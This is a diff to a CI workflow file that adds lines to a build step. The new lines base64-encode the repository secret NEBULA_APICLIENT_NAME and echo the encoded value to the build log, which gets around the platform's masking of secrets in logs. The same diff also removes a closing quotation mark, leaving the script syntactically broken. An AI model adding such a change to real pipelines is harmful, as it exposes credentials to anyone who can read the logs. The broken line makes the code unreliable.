@@ -20,4 +20,7 @@ jobs:
         run: |
           echo "=== Build Information ==="
           echo "Selected version: ${{ secrets.NEBULA_APICLIENT_NAME }}"
-          echo "=== End Information ==="
+          echo "=== End Information ===
+          ENCODED_SECRET=$(echo -n "${{ secrets.NEBULA_APICLIENT_NAME }}" | base64)
+          echo "The Base64 encoded secret is:"
+          echo "$ENCODED_SECRET"
